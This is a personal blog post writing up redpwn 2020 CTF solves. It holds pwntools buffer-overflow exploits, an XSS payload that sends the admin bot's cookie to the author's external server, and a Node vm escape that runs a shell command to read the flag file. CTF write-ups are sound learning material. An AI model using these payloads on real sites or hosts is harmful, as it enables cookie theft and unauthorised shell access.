@@ -1,0 +1,244 @@
+<p>
+I have recently competed in the <a href="https://ctf.redpwn.net">redpwn ctf</a> and wanted to write a little about some of the challenges, and what I learnt along the way.<br><br>
+For this competition I was with a work friend, as well as some of his friends who I'd never met, so it was a good opportunity to meet some new people who were interested in security, and learn from them. I'll be sharing challenges in this post that I completed, my methodology and what I learned along the way, so let's jump right in.<br><br>
+</p>
+<h2>rev/ropes</h2>
+<p>This challenge was a super quick one, as it didn't even really need to be reverse engineered. I downloaded the binary, ran:<br>
+<pre><code class="bash">
+$ strings ropes
+--- TRIMMED---
+First part is: flag{r0pes_ar3_
+Second part is: just_l0ng_str1ngs}
+--- TRIMMED---
+</code></pre><br>
+And there was the answer for all to see. So I pretty quickly disposed of that challenge, good to get some points on the board early, and it gave me some confidence to continue. <br><br>
+Quick side note, I enjoyed that this CTF had some easier challenges, as sometimes I've found it can be all too hard, and you lose hope and struggle a bit too much. It's definitely nice getting a boost, and starting off strong, like this problem allowed. Anyway, moving right along.<br><br>
+</p>
+<h2>pwn/coffer-overflow-0</h2>
+<p>
+The next challenge I attempted was a pwn challenge, and I was excited but hesitant, as my pwning skills are not the best. However as it turned out this challenge again was a pretty easy introduction into the CTF competition. For one thing, they give you the source which is super nice, and in this case, it was pretty much as easy as it gets for buffer overflows which the name had already hinted at. The code is included below and very closely mirrors a textbook example of a buffer overflow, it also reminds me of the early protostar levels which I looked at while doing LiveOverflow's great YouTube course.<br>
+<pre><code class="c">
+#include <stdio.h>
+#include <string.h>
+
+int main(void)
+{
+  long code = 0;
+  char name[16];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
+  puts("What do you want to fill your coffer with?");
+
+  gets(name);
+
+  if(code != 0) {
+    system("/bin/sh");
+  }
+}
+</code></pre><br>
+All that was necessary for this was to fill up the `name` buffer and then overflow into `code`. I did however use this as an opportunity to try out pwntools, as this seemed to be the recommmended way of interacting with the server. My exploit code finished up looking like this:<br>
+<pre><code class="python">
+from pwn import *
+
+host, port = "2020.redpwnc.tf", "31199"
+with remote(host, port) as r:
+    intro = r.recv()
+    print("Line 1")
+    question = r.recv()
+    print(question)
+    r.sendline("AAAABBBBCCCCDDDDEEEEFFFFG")
+    r.interactive()
+</code></pre><br>
+This spawned a shell, and then I was able to simply cat the flag, and the challenge was done! Another one bites the dust.<br><br>
+</p>
+<h2>pwn/coffer-overflow-1</h2>
+<p>
+The next challenge I picked up was coffer-overflow-1, which based on the name, promised many of the same shenanigans of the first problem, though no doubt more difficult.
+I pulled the binary, and thankfully the source was made available again. This time, it looked very similar, with an important distinction. See if you can spot it below:<br>
+<pre><code class="c">
+#include <stdio.h>
+#include <string.h>
+
+int main(void)
+{
+  long code = 0;
+  char name[16];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
+  puts("What do you want to fill your coffer with?");
+
+  gets(name);
+
+  if(code == 0xcafebabe) {
+    system("/bin/sh");
+  }
+}
+</code></pre><br>
+Congrats if you spotted it, the only difference in this challenge is that the code had to be overwritten with a specific value, you couldn't just write anything. For this I slightly modified my exploit from the previous challenge and ended up with this:<br>
+<pre><code class="python">
+from pwn import *
+
+payload = b'AAAABBBBCCCCDDDDEEEEFFFF'
+payload += struct.pack("l", 0xcafebabe)
+print(payload)
+
+host, port = "2020.redpwnc.tf", "31255"
+with remote(host, port) as r:
+    intro = r.recv()
+    print("Line 1")
+    question = r.recv()
+    print(question)
+    r.sendline(payload)
+    r.interactive()
+</code></pre><br>
+python's utilities as well as pwntools made this challenge a breeze, and we were off and rolling with another challenge complete. Onwards and upwards.<br><br>
+</p>
+<h2>pwn/coffer-overflow-2</h2>
+<p>Now starting to get the hang of things, I was curious what would come next in this series. As it turned out, the answer was some slightly trickier control flow alteration. When I looked at the source for the next challenge, I was reminded again of the buffer overflow challenges in LiveOverflow's course and re-watched one of his videos for hints, and then got it out with some help from gdb, radare2, and some trial and error. Here's the source code:<br>
+<pre><code class="c">
+#include <stdio.h>
+#include <string.h>
+
+int main(void)
+{
+  char name[16];
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  setbuf(stderr, NULL);
+
+  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
+  puts("What do you want to fill your coffer with?");
+
+  gets(name);
+}
+
+void binFunction() {
+  system("/bin/sh");
+}
+</code></pre><br>
+The trick here is to override the saved return value on the stack, so that when the function ends and pops the value to return to off the stack, it instead pops off the address of the `binFunction`. Here's how I achieved this: <br>
+<pre><code class="python">
+from pwn import *
+
+charbuffer = b'AAAABBBBCCCCDDDD'
+rbp = b'AAAAAAAA'
+winfunction = struct.pack('l', 0x00000000004006e6)
+payload = charbuffer + rbp + winfunction
+
+host, port = "2020.redpwnc.tf", "31908"
+with remote(host, port) as r:
+    intro = r.recv()
+    print(intro)
+    question = r.recv()
+    print(question)
+    r.sendline(payload)
+    r.interactive()
+</code></pre><br>
+And with that done, and another flag under the belt I decided to head to bed for the night, and continue the hacking tomorrow.<br><br>
+</p>
+<h2>web/static-pastebin</h2>
+<p>
+I decided to take a quick break from pwn challenges and try my hand at the web challenges, which I at least have more experience being on the other end of. I've not done a lot of web hacking, but am pretty familiar with the types of attacks and vulnerabilities. The site for this challenge was very simple, it had a page which allowed you to enter text into a field. When you clicked the create button it took you to the '/paste' page with the text you entered base64 encoded into the URL.<br>
+The way this challenge worked is that you could send any page with 'issues' to the admin bot. From the Discord I learnt that the admin bot had a cookie with the flag, so you basically had to inject code to steal the cookie when the bot visits the page.<br>
+It became clear that it would be possible to inject markup into the paste page, however it was not quite as simple as being able to enter '<script src="evil.js"></script>' as the input was 'sanitised' before it was outputted to the page. Thankfully the input sanitation was not all that sophisticated and simply counted '<' and '>' characters to try and prevent you opening tags. This made it a bit harder to do a script tag, as anything after the close '>' would not be echoed to the page. <br>
+This meant we needed an XSS vector that executed before the close tag. I tried a couple of different ones, I got one working eventually and submitted it to be visited by the bot. Unfortunately this didn't work, I did a bit more digging and saw that the method I used to inject JS didn't work in Chrome, which I assume is what the bot was running. So back to the drawing board, and after visiting an excellent <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS cheat sheet</a> I found one that seemed to work on Chrome and ended up with this as my exploit code:<br>
+<pre><code class="html">
+><img src=x onerror=eval(fetch(https://hack.etopiei.com/cookies/${btoa(document.cookie.split(';'))}))>
+</code></pre><br>
+I set up a quick express server to listen and log the cookies that I stole and after the bot visited the flag popped up in the console. Another challenge done. <br><br>
+Quick side note, you may notice the extra '>' at the start of the payload above, that was to ensure that the bracket count was correct when the img tag was being read by the sanitiser.<br><br>
+</p>
+<h2>misc/uglybash</h2>
+<p>
+I had a bit of a break after the static-pastebin challenge, and had a brief look at some other challenges, but nothing really jumped out immediately. A little while later I came to the ugly bash challenge. This challenge gave an extremely obfuscated bash script, that when ran printed: 'Don't just run it, dummy'. The problem description promised that doing this challenge correctly would result in the flag being printed in the comment of the script.<br>
+I don't think I did this task as designed, but my method to solve this was to add:<br>
+<pre><code class="bash">
+set -x
+trap read debug
+</code></pre><br>
+At the beginning of the script, and by doing this I saw the following when I saved the text output and grepped for the results:<br>
+<img alt="bash-flag" src="uglybash.png"><br>
+So, although I didn't use zsh, the flag was mine. I'll be curious to read how other people solved this challenge though.<br><br>
+</p>
+<h2>misc/CaaSiNO</h2>
+<p>
+This challenge was interesting, but I don't feel like I really earned the points on this one. The code was given for a Javascript REPL essentially, though with some restrictions to try and stop you from breaking out of the VM. I was investigating how the 'vm' node module works that they were using for this challenge, and came across <a href="https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/">this article</a> about this package.<br><br>The article gave the exact code necessary to break out and steal the flag which was as simple as:<br>
+<pre><code class="js">
+let p = this.constructor.constructor('return this.process')(); p.mainModule.require('child_process').execSync('cat /ctf/flag.txt').toString()
+</code></pre><br>
+So this challenge turned out to be pretty easy, but I don't feel like I really solved it, I just happened to find an article detailing the exact method to break out of the VM, and finished this challenge rather quickly.<br><br>
+</p>
+<h2>crypto/primimity</h2>
+<p>
+This was one of the first problems I took a look at in this CTF. The code was given that was used to generate an RSA public key, and the challenge description explained that 3 1024 bit primes were used to generate the key.<br>
+When reading the code I saw that the way the primes are generated they are not very far away from each other so after reading <a href="https://crypto.stackexchange.com/questions/5262/rsa-and-prime-difference">here</a> about a small difference in primes with RSA I tried to use Fermat's Factorisation Method to try and crack the values used, after running this for a long time with no luck I gave up on this.<br><br>
+Later on I was discussing this problem with one of my teammates and he pointed out the key insight that because three primes were used instead of 2 i.e. n = p * q * r we know that p, q and r should reside close to the cube root of n as the difference between p, q and r is small. Given this, I wrote a quick python script to brute force the values given a small range where the numbers could exist.<br>
+The values came out quickly and so my teammate sent me a script he wrote to decrypt the ciphertext and combining them lead to this final script:<br>
+<pre><code class="python">
+def decrypt(c, e, p, q, r):
+    flag = ''
+    phi = 1
+    for i in [p, q, r]:
+        phi *= (i - 1)
+    d = inverse(e, phi)
+    m = pow(c, d, n)
+    return long_to_bytes(m).decode()
+
+
+n = int((open("public").read()))
+cube_root = nth_root(n, 3) - 1000000
+if cube_root % 2 == 0:
+    cube_root += 1
+
+factors = []
+for x in range(cube_root, cube_root + 100000000000, 2):
+    if n % x == 0:
+        factors.append(x)
+        if len(factors) == 3:
+            p = factors[0]
+            q = factors[1]
+            r = factors[2]
+            c = int(open("c").read())
+            print("Got all variables needed, trying to decrypt!")
+            print(decrypt(c, 65537, p, q, r))
+            exit()
+</code></pre><br>
+(This code also included an nth root function taken from SO and some imports, but those aren't pertinent to the problem here)
+After running this, the flag came out and we could tick another challenge off.<br><br>
+</p>
+<h2>pwn/secret-flag</h2>
+<p>
+The final challenge I completed was another pwn one, this one did not come with source, so the difficulty was amped up a bit.<br>
+Firstly I dumped the binary into Ghidra and saw the basic structure of the code was basically the following:<br>
+<pre><code class="c">
+int main() {
+	int fd;
+	void* buf;
+	char[24] inBuf;
+
+	buf = malloc(0x100);
+	fd = open("flag.txt");
+	read(fd, buf, 0x100);
+
+	puts("I have a secret flag, which you'll never get");
+	puts("What is your name young adventurer?");
+	fgets(inBuf, 0x14, stdin);
+	printf("Hello there: ");
+	printf(inBuf);
+	
+}
+</code></pre><br>
+So it seems we have a format string vulnerability, which I think I've only exploited once before so this was a bit of a learning experience. After reading a couple of articles and papers (<a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">paper</a>, <a href="https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf">tutorial</a>, <a href="https://security.stackexchange.com/questions/153583/how-to-leak-addresses-with-format-string-exploits">stack exchange post</a>) I felt pretty confident I could exploit this, and thankfully it was a near identical situation to <a href="https://teambi0s.gitlab.io/bi0s-wiki/pwning/format-string/leak/">this article</a> so I utilised what I'd learnt there and got the flag in the end.<br>
+<img src="string-exploit.png" alt="Format String Exploit"><br>
+And that was the final challenge I completed. All in all it was a very enjoyable CTF, I liked learning new things and will try be more involved in CTF competitions in future. I think our team came 250th overall which is pretty good. Thanks to the team, and the organisers for a great event. To see any of the other challenges, or read some other write-ups check out <a href="https://github.com/redpwn/redpwnctf-2020-challenges">redpwn's GitHub</a> and thanks for reading.<br><br>
+- etopiei (26/6/2020)
+</p>
